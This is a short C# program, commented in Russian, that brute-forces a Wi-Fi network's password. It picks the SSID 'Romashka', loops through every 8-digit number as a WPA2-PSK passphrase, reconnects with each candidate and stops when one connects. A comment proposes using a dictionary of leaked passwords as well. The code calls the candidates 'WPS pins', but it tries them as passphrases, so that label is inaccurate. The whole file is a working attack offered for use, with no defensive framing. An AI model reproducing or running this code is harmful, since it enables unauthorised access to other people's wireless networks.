using System.Text;
using NativeWifi;

// Берем первый попавшийся Wi-Fi адаптер
WlanClient client = new ();
WlanClient.WlanInterface wlan = client.Interfaces[0];
wlan.Scan();
Wlan.WlanAvailableNetwork[] networks = wlan.GetAvailableNetworkList(0);
if (networks.Length == 0)
{
  Console.WriteLine("No networks found");
  return;
}
else
{
  foreach (var t in networks)
  {
    string ssid = Encoding.Default.GetString(t.dot11Ssid.SSID);
    Console.WriteLine(ssid);
  }
}

// Отбираем сеть по её названию
Wlan.WlanAvailableNetwork network = networks
        .FirstOrDefault(n => Encoding.Default.GetString(n.dot11Ssid.SSID) == "Romashka");

// Подготавливаем данные для создания профиля
string profileName = Encoding.Default.GetString(network.dot11Ssid.SSID);
byte[] hexBytes = Encoding.Default.GetBytes(profileName);
string hex = BitConverter.ToString(hexBytes).Replace("-", "");

// Перебираем значения WPS pin - максимум 8 цифр.
// Также же тут можно сделать перебор по словарю утекших паролей
for (int i = 0; i < 99999999; i++)
{
  string wpsPin = $"{i}";
  wpsPin = new string('0', 8 - wpsPin.Length) + wpsPin;
  Console.WriteLine($"Trying pin {wpsPin}");
	
  string profileXml = string.Format(
    "<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><hex>{1}</hex><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><connectionMode>manual</connectionMode><autoSwitch>false</autoSwitch><MSM><security><authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{2}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>",
    profileName, hex, wpsPin);

  try
  {
    wlan.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
    wlan.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, profileName);
    // Тут задается время ожидания для попытки
    // В моей конфигурации это 2 секунды, но
    // время придется подбирать вручную
    await Task.Delay(2 * 1000);
  }
  catch (Exception e)
  {
    Console.WriteLine(e);
  }

  if (wlan.CurrentConnection.isState == Wlan.WlanInterfaceState.Connected)
  {
    Console.WriteLine($"WPS pin is {wpsPin}");
    break;
  }

  Console.WriteLine($"WPS pin {wpsPin} did not work");
}

